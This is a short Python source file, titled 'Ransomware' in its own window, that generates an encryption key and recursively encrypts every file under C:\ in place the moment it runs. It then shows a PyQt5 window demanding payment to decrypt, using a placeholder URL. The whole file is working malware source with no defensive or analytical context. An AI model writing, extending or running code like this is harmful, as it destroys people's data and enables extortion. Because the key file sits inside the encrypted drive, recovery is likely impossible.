import os
from cryptography.fernet import Fernet
import sys
from PyQt5.QtGui import *
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
key = Fernet.generate_key()

with open('mykey.key', 'wb') as mykey:
    mykey.write(key)
f = Fernet(key)
files = [None]
def listdir():
    return getListOfFiles('C:\\')

def encrypt(filename, key):
    f = Fernet(key)
    with open(filename,"rb") as file:
        file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as file:
            file.write(encrypted_data)
def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)

    return allFiles

for f2 in listdir():
    fkey = open("mykey.key","rb")
    encrypt(f2, fkey.read())
def window():
    app = QApplication(sys.argv)
    widget = QWidget()

    label = QLabel(widget)
    label.setText("I encrypted all your files to decrypt them pay me X dollars, URL: https://google.com")#google for example

    widget.setWindowTitle("Ransomware")
    widget.show()
    widget.setGeometry(80, 80, 600, 400)

    sys.exit(app.exec())

if __name__ == '__main__':
    window()
